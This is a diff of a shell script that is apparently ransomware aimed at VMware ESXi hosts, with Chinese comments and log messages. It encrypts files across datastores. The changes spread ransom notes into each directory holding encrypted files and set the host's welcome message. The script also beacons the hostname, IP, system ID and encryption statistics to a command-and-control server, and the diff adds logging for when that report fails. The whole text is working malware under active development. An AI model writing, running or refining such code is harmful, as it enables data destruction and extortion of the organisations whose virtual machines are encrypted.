@@ -37,10 +37,13 @@ sha256_file(){
 }
 
 http_post(){
-    if has_cmd wget; then
+    # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
+    if has_cmd curl; then
+        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
+    elif has_cmd wget; then
         wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
-    elif has_cmd curl; then
-        curl -s -X POST -d "$2" "$1" >/dev/null 2>&1
+    else
+        return 127
     fi
 }
 
@@ -187,12 +190,26 @@ draw_bar(){
 # ────────────────────────────────────────
 drop_notes(){
     SID="$1"
+    ND="$2"
     NOTE=$(printf '%s' "$RANSOM_TXT" | sed "s/{sid}/$SID/g")
+    # 1) 数据存储顶层
     for DS in /vmfs/volumes/*; do
         [ -d "$DS" ] || continue
-        printf '%s\n' "$NOTE" > "$DS/READ_ME_解密教程.txt" 2>/dev/null
+        printf '%s\n' "$NOTE" > "$DS/READ_ME_DECRYPT.txt" 2>/dev/null
     done
-    printf '%s\n' "$NOTE" > /tmp/READ_ME_解密教程.txt 2>/dev/null
+    # 2) 每个含有被加密文件的目录（去重后逐个投放）
+    if [ -n "$ND" ] && [ -f "$ND" ]; then
+        WROTE=0
+        sort -u "$ND" > "$ND.uniq" 2>/dev/null || cp "$ND" "$ND.uniq"
+        while IFS= read -r D; do
+            [ -n "$D" ] || continue
+            [ -d "$D" ] || continue
+            printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null && WROTE=$((WROTE+1))
+        done < "$ND.uniq"
+        rm -f "$ND.uniq"
+        log "勒索信已投放到 $WROTE 个目录"
+    fi
+    printf '%s\n' "$NOTE" > /tmp/READ_ME_DECRYPT.txt 2>/dev/null
     if has_cmd esxcli; then
         esxcli system welcomemsg set -m "$(printf '%s' "$NOTE" | head -5)" 2>/dev/null
     fi
@@ -212,7 +229,10 @@ beacon(){
     DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
     TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
     DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
-    http_post "$C2" "$DATA"
+    if ! http_post "$C2" "$DATA"; then
+        log "!!! 上报失败: $C2"
+        log "!!! 请检查回连地址是否可达、端口(本服务在 :8080)、握手密钥 SECRET 是否与后台一致"
+    fi
 }
 
 # ────────────────────────────────────────
@@ -252,6 +272,8 @@ main(){
     TYPES=""
     FIRST=1
     LAST_BEACON=$(date +%s)
+    NOTE_DIRS="/tmp/.jnotedirs_$$"
+    : > "$NOTE_DIRS"
 
     if [ "$TOTAL" -gt 0 ]; then
         for DS in /vmfs/volumes/*; do
@@ -269,6 +291,7 @@ main(){
                 if encrypt_file "$F" "$PUBKEY"; then
                     COUNT=$((COUNT+1))
                     SIZE=$((SIZE+FSIZE))
+                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # 记录目录，供勒索信投放
                     case ",$TYPES," in
                         *",$EXT,"*) ;;
                         *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
@@ -294,7 +317,8 @@ main(){
 
     log "加密完成: $COUNT/$TOTAL 个文件, $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
 
-    drop_notes "$SID"
+    drop_notes "$SID" "$NOTE_DIRS"
+    rm -f "$NOTE_DIRS"
     beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "1" "$TOTAL" "$TOTAL_BYTES"
 }
 
